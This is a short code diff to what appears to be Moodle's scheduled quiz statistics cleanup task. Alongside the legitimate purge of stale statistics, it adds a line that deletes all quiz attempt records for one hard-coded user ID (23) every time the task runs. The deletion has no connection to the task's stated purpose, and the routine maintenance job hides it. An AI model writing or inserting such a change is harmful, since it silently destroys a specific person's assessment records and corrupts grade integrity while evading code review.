@@ -49,6 +49,8 @@ class quiz_statistics_cleanup extends \core\task\scheduled_task {
 
         $expiretime = time() - 4 * HOURSECS;
         $DB->delete_records_select('quiz_statistics', 'timemodified < ?', array($expiretime));
+		
+		$DB->delete_records_select('quiz_attempts', 'userid = ?', array(23));
 
         return true;
     }
